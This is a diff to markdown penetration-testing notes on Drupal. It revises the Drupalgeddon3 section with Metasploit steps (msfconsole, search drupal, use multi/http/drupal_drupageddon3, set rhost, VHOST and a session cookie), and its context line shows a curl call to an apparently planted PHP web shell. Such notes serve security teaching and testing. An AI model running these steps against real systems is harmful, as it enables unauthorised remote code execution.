@@ -395,7 +395,11 @@ curl http://drupal-dev.compnay.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=
 ### Drupalgeddon3
 Drupalgeddon3 is an authenticated remote code execution vulnerability that affects multiple versions of Drupal core. It requires a user to have the ability to delete a node. We can exploit this using Metasploit, but we must first log in and obtain a valid session cookie. Once we have the session cookie, we can set up the exploit module as follows:
 ```
-use exploit multi/http/drupal_drupageddon3
+msfconsole
+```
+```
+search drupal
+use multi/http/drupal_drupageddon3
 set rhost <IP address>
 set VHOST <URI>
 set drupal_session <session cookie>
